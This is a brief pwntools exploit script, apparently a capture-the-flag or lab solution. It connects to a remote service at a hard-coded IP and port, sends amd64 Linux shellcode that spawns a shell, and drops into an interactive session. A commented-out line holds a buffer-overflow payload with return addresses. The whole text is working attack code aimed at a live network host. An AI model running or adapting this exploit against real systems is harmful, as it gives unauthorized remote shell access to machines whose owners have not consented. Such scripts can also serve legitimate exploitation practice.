from pwn import *
context.arch = 'amd64'
# p = process('./shellcode')
# To connect to tcp server
p = remote('140.113.207.240', 8836)
shellcode = asm(shellcraft.amd64.linux.sh()) #
p.send(shellcode)
# p.send(b"0123456789123456"+p64(0x400566)+p64(0x601060))

p.interactive()
